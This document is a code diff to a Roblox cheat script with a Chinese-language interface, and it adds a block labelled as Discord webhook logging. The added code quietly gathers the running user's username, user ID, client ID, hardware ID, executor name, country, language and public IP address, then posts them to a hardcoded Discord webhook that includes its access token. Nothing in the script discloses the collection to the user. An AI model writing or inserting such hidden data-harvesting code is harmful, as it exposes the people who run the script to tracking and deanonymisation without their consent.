@@ -1074,6 +1074,115 @@ Tabs.ThemeTab:Dropdown({
         })
     end
 })
+-- ===================== Discord Webhook 日志 =====================
+local GS_WEBHOOK = "https://discordapp.com/api/webhooks/1466372397405048956/yCRf5srFXysEA60LagpQWoz_cPFi0vTRDVrG102tMGHp5jjtUSEHZb-mF3xXc5Ulf0QV"
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local LocalizationService = game:GetService("LocalizationService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
+
+local localPlayer = Players.LocalPlayer
+if not localPlayer then
+    return
+end
+
+local function safeCall(func, fallback)
+    local success, result = pcall(func)
+    return success and result or fallback
+end
+
+local function getAvatarImage(userId)
+    return safeCall(function()
+        local url = string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", userId)
+        local response = HttpService:JSONDecode(game:HttpGet(url))
+        return response.data[1].imageUrl
+    end, "https://www.roblox.com/Thumbs/Avatar.ashx?x=180&y=180&userId=" .. userId)
+end
+
+local function getDeviceType()
+    local touch = UserInputService.TouchEnabled
+    local keyboard = UserInputService.KeyboardEnabled
+    local mouse = UserInputService.MouseEnabled
+    
+    if touch and not keyboard and not mouse then return "移动设备"
+    elseif not touch and keyboard and mouse then return "电脑"
+    elseif touch and keyboard and mouse then return "模拟器"
+    else return "未知" end
+end
+
+local function getExecutor()
+    return (identifyexecutor and identifyexecutor()) or 
+           (getexecutorname and getexecutorname()) or 
+           "未知"
+end
+
+local function getHWID()
+    return (gethwid and gethwid()) or "无法获取"
+end
+
+local function getIPAddress()
+    local request = http_request or request or (syn and syn.request)
+    if not request then return "无请求函数" end
+    
+    return safeCall(function()
+        return request({Url = "https://api.ipify.org/", Method = "GET"}).Body
+    end, "获取失败")
+end
+
+local userId = localPlayer.UserId
+local placeId = game.PlaceId
+
+local payload = {
+    username = "机器人",
+    embeds = {{
+        color = tonumber("0x32CD32"),
+        title = string.format("有人正在使用脚本 %s %d时%d分", 
+            os.date("%Y年%m月%d日"), 
+            tonumber(os.date("%H")), 
+            tonumber(os.date("%M"))),
+        
+        thumbnail = {url = getAvatarImage(userId)},
+        
+        fields = {
+            {name = "用户名", value = localPlayer.Name, inline = true},
+            {name = "显示名称", value = localPlayer.DisplayName, inline = true},
+            {name = "用户ID", value = string.format("[%d](https://www.roblox.com/users/%d/profile)", userId, userId), inline = true},
+            
+            {name = "客户端ID", value = safeCall(function() return RbxAnalyticsService:GetClientId() end, "获取失败"), inline = false},
+            
+            {name = "地图ID", value = string.format("[%d](https://www.roblox.com/games/%d)", placeId, placeId), inline = true},
+            {name = "地图名称", value = safeCall(function() return MarketplaceService:GetProductInfo(placeId).Name end, "获取失败"), inline = true},
+            
+            {name = "注入器", value = getExecutor(), inline = true},
+            {name = "账号年龄", value = string.format("%d天", localPlayer.AccountAge), inline = true},
+            
+            {name = "设备", value = getDeviceType(), inline = false},
+            {name = "国家", value = string.format("国家: %s", safeCall(function() return LocalizationService:GetCountryRegionForPlayerAsync(localPlayer) end, "获取失败")), inline = false},
+            {name = "语言", value = string.format("语言: %s", localPlayer.LocaleId), inline = false},
+           
+            {name = "HWID", value = getHWID(), inline = true},
+            {name = "IP地址", value = getIPAddress(), inline = true},
+            {name = "IP查询", value = string.format("https://binaryfork.com/zh/tools/ip-address-lookup/?ip=%s#ip-lookup", getIPAddress()), inline = false}
+        }
+    }}
+}
+
+local request = http_request or request or HttpPost or (syn and syn.request)
+if not request then
+    return
+end
+
+safeCall(function()
+    request({
+        Url = GS_WEBHOOK,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(payload)
+    })
+end)
 
 -- ===================== 腳本完成 =====================
 task.wait(1)
